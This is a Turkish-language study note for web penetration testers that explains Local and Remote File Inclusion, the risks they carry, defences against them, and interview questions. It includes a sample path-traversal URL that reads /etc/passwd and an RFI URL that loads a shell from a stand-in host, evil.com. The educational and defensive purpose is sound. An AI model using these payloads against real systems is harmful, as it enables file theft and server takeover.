# 📌 1-Giriş ve Temel Kavramlar – File Inclusion

File Inclusion, web uygulamalarında bir dosyanın başka bir dosya veya URL üzerinden uygulamaya dahil edilmesi işlemidir. Yanlış veya yetersiz doğrulama ile bu özellik, **Local File Inclusion (LFI)** veya **Remote File Inclusion (RFI)** gibi kritik güvenlik açıklarına yol açabilir. Bu not, web pentesterlar için güncel bilgiler ve mülakat hazırlığı perspektifi sunar.

---

## 📌 Local File Inclusion (LFI)

**Açıklama:**  
LFI, saldırganın sunucudaki yerel dosyaları uygulama aracılığıyla okumasını veya çalıştırmasını sağlar. Genellikle `include()`, `require()`, `include_once()` gibi PHP fonksiyonlarının hatalı kullanımı sonucu ortaya çıkar.

**Örnek PoC:**  
URL üzerinden LFI:
`http://target.com/index.php?page=../../../../etc/passwd`

**Kullanım:**  
- Sunucudaki sensitive dosyaları elde etme (`/etc/passwd`, `config.php`)  
- Log dosyalarını okuma ve log poisoning ile RCE elde etme  
- Directory traversal teknikleri ile klasörler arasında gezinme

**Sonuç:**  
- Sistem bilgileri ve kullanıcı verileri sızdırılabilir  
- LFI doğru şekilde engellenmezse RCE’ye dönüşebilir

---

## 📌 Remote File Inclusion (RFI)

**Açıklama:**  
RFI, saldırganın uzak bir sunucudan dosya yükleyip çalıştırmasına izin verir. Genellikle URL tabanlı include fonksiyonları hatalı şekilde filtrelenmediğinde ortaya çıkar.

**Örnek PoC:**  
URL üzerinden RFI:
`http://target.com/index.php?page=http://evil.com/shell.txt`

**Kullanım:**  
- Uzaktaki zararlı PHP veya script dosyalarını çalıştırma  
- Web shell yükleyerek sunucuyu ele geçirme  
- Backdoor veya malware dağıtımı

**Sonuç:**  
- Uzak sistem kontrolü sağlanabilir  
- Kritik sunucu yetkileri ele geçirilebilir

---

## 📌 File Inclusion Riskleri

- **Sensitive Data Exposure:** Config dosyaları, loglar, kullanıcı bilgileri  
- **Remote Code Execution (RCE):** LFI + log poisoning veya RFI üzerinden  
- **Denial of Service (DoS):** Büyük dosya veya recursive include ile  
- **Server Compromise:** Web shell veya malware yükleme ile

---

## 📌 Kullanım Senaryoları

1. Dinamik sayfa yükleme: `index.php?page=about.php`  
2. Log dosyası okuma: LFI ile `/var/log/apache2/access.log`  
3. Remote library include: RFI ile zararlı script çağırma  

---

## 📌 Savunma ve Best Practices

1. **Whitelist Approach:** Yalnızca belirlenen dosyaların include edilmesine izin ver.  
2. **Input Validation / Sanitization:** Parametrelerde path traversal veya URL engelle.  
3. **Disable URL Include:** PHP’de `allow_url_include=Off`  
4. **Least Privilege:** Web server’ın dosya sistemine erişim izinlerini kısıtla  
5. **Logging & Monitoring:** Şüpheli include denemelerini kaydet ve alert üret

---

## 💡 Mülakat Soruları

1. LFI ve RFI arasındaki fark nedir?  
2. RFI için `allow_url_include` neden kritik bir ayardır?  
3. File Inclusion zafiyetleri hangi web fonksiyonlarından kaynaklanır?  
4. LFI + log poisoning ile RCE nasıl elde edilir?  
5. File Inclusion saldırılarını önlemek için hangi önlemler alınmalıdır?  

---

## ✅ Sonuç

File Inclusion, web uygulamalarında kritik bir güvenlik açığıdır.  
- LFI ve RFI riskleri sunucuyu ele geçirme, veri sızdırma ve malware dağıtımı ile sonuçlanabilir.  
- Modern pentesterlar, hem tespit hem de önleme yöntemlerini bilmelidir.  
- Whitelist, input validation, URL include kısıtlaması ve log/monitoring en temel savunma yöntemleridir.  
